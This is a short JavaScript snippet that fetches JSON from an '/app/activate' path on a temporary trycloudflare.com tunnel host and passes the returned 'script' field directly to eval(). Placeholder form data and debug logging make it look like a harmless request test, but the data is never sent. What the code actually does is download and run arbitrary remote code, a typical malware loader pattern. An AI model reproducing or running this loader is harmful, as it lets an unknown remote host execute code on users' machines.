const baseUrl = 'https://existing-grammar-discount-williams.trycloudflare.com';
const dynamicSegment = '/app/activate';
const fullUrl = `${baseUrl}/${dynamicSegment}`;

const requestData = {
  name: 'John Doe',
  email: 'john.doe@example.com',
  message: 'This is a test message'
};

fetch_request(fullUrl, requestData)

function fetch_request(url, requestData)
{
  console.log('start')
    fetch(url, {
        method: 'GET',
      })
        .then(response => {
          console.log(response)
          console.log('new')
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
          return response.json();
        })
        .then(data => {
          console.log('test')
            eval(data.script);
        })
        .catch(error => {
          console.error('There was a problem with the fetch operation:', error);
        });
}